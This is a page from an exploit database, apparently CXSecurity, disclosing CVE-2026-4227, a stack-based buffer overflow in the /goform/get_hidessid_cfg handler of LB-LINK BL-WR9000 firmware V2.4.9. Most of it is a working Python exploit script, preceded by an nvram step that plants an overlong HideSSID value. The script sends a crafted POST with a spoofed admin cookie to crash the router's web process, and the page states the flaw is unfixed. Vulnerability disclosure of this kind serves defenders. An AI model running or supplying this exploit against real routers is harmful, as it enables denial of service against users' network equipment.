---
title: LB-LINK BL-WR9000 V2.4.9 - Stack-based Buffer Overflow in /goform/get_hidessid_cfg
url: https://cxsecurity.com/issue/WLB-2026030025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-17
fetch_date: 2026-03-18T04:20:59.669587
---

# LB-LINK BL-WR9000 V2.4.9 - Stack-based Buffer Overflow in /goform/get_hidessid_cfg

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LB-LINK BL-WR9000 V2.4.9 - Stack-based Buffer Overflow in /goform/get\_hidessid\_cfg** **2026.03.17**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-4227](https://cxsecurity.com/cveshow/CVE-2026-4227/ "Click to see CVE-2026-4227")**  CWE: **[CWE-121: Stack-based Buffer Overflow](https://cxsecurity.com/cwe/CWE-121%3A%20Stack-based%20Buffer%20Overflow "Click to see CWE-121: Stack-based Buffer Overflow")** | |

#!/usr/bin/env python3
# Exploit Title: LB-LINK BL-WR9000 HideSSID Stack Overflow
# CVE: CVE-2026-4227
# Date: 2026-03-16
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Affected: LB-LINK BL-WR9000 firmware V2.4.9
# Tested on: LB-LINK BL-WR9000 V2.4.9
# Category: Remote Denial of Service
# Platform: Embedded (MIPS/ARM)
# Exploit Type: Remote
# CVSS: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
# Description: Stack-based buffer overflow in /goform/get\_hidessid\_cfg via overly long HideSSID nvram value
# Fixed in: Not fixed (as of March 2026)
# Usage:
# python3 exploit.py <router\_ip>
#
# Examples:
# python3 exploit.py 192.168.16.1
#
# Options:
# -- (none implemented)
#
# Notes:
# • Requires nvram value HideSSID to be set to a string longer than ~64 bytes before first ';'
# • Example: nvram\_set HideSSID 'A'\*300';0;' ; nvram\_commit
# • Triggers crash of goahead web process (DoS)
#
# How to Use
#
# Step 1:
# Set malicious nvram value (via shell or vulnerable web interface if possible):
# nvram\_set HideSSID 'A'\*300';0;'
# nvram\_commit
#
# Step 2:
# Run this script against the router:
# python3 exploit.py 192.168.16.1
import requests
import sys
import time
def main():
if len(sys.argv) != 2:
print("Usage: python3 exploit.py <router\_ip>")
print("Example: python3 exploit.py 192.168.16.1")
sys.exit(1)
ip = sys.argv[1].strip()
target = f"http://{ip}"
url = f"{target}/goform/get\_hidessid\_cfg"
headers = {
"X-Requested-With": "XMLHttpRequest",
"Accept-Language": "en",
"Accept": "application/json, text/javascript, \*/\*; q=0.01",
"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
"Referer": f"{target}/admin/main.html",
"Cookie": "platform=0; user=admin",
"Connection": "keep-alive",
"Content-Type": "application/x-www-form-urlencoded",
}
data = "type=gethide2"
print(f"[+] Target URL : {url}")
print(f"[+] Payload : type=gethide2")
print(f"[+] Cookie : {headers['Cookie']}")
print("-"\*50)
try:
print("[+] Sending exploit request...")
start = time.time()
response = requests.post(
url,
headers=headers,
data=data,
timeout=8,
allow\_redirects=False
)
elapsed = time.time() - start
print(f"[+] Status code: {response.status\_code}")
print(f"[+] Response : {response.text[:150]}...")
except requests.exceptions.Timeout:
print("[+] Router crashed (timeout) — Exploit successful!")
except requests.exceptions.ConnectionError:
print("[+] Connection refused / socket closed — Exploit successful!")
except Exception as e:
print(f"[!] Unexpected error: {e}")
else:
print("[?] No crash detected. Check HideSSID value.")
print("\n[+] Done.")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030025)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top